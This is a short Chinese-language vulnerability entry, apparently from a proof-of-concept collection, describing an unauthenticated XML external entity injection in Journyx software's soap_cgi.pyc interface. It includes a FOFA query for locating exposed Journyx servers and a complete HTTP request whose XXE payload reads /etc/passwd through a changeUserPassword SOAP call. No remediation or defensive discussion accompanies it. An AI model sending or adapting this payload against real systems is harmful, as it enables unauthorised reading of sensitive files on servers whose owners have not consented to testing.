# Journyx存在未经身份验证的XML外部实体注入

Journyx项目管理软件 soap_cgi.pyc 接口存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

## fofa

```javascript
"Journyx"
```

## poc

```javascript
POST /jtcgi/soap_cgi.pyc HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Ldwk: bG91ZG9uZ3dlbmt1
User-Agent: curl/8.1.2
Content-Length: 333

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091049662.png)